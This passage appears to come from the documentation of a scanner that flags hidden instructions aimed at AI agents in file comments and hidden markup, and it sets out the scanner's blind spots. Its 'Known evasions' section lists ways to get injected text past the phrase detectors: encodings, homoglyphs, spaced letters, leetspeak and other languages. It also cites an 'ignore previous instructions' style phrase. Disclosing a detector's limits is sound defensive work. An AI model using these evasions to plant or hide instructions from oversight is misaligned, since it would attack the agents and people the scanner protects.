* Verbs outside the word list (`fetch`, `follow`, `visit`, `open`, `download`, `post`, `paste`,
  `append`, `include`) when no listed word or HIGH phrase is in the same comment.
* Comment syntaxes of other formats the walk reads: reStructuredText `..` comments,
  AsciiDoc `//` and `////` blocks, and MDX `{/* */}` expressions.
* A `hidden` attribute written outside a start tag this check can parse (a `>` inside an
  attribute value that is not quoted, or a tag longer than about 2,000 characters).
* Anything inside a closed `<script>` or `<style>` body in an HTML-family file except a
  terminated `<!--` comment.
* A comment in a programming-language source longer than 64 KB, or any comment form
  other than `<!-- -->` in one; hidden text of any kind in a source file.
* A comment closed by `--!>` (the body is then read up to the next `-->`, which is more
  text, not less; in a source file with no later `-->` it is not a comment).
* Hidden-element bodies, link-reference titles and comment forms other than `<!-- -->`
  in `.txt` files (plain text is not rendered).
* The tool-directive arguments above beyond what they are checked for: a payload of three
  or fewer bare words in a `cspell:ignore` list that is not a HIGH phrase.

## Known evasions of the phrase detectors

These limits were stated in the README before 0.1.0 and are kept here in full.

- **Paraphrase, translation and encodings evade it.** That covers ROT13, base32,
  gzip, HTML-entity encoding, Cyrillic homoglyphs, and a phrase split by a blank
  line. Base64, hex and percent-encoded runs *are* decoded and read (`encoded-instruction`),
  and NFKC look-alikes and zero-width characters are caught.
- **Cheap evasions of the word lists work.** Letters spaced apart (`i g n o r e`), leetspeak,
  diacritics or a dotless `i`, a word glued to others without a case change, inflections the
  patterns do not list, and any language but English all get past the phrase detectors and
  the comment word search. Common inflections (`ignores`, `ignored`, `executing`, `sends`)
  and CamelCase (`IgnorePreviousInstructions`) in comments are covered.
- **Ordinary tutorial prose can trip it.** A sentence like "You should now see the
  output." is flagged HIGH `agent-addressed-imperative`.
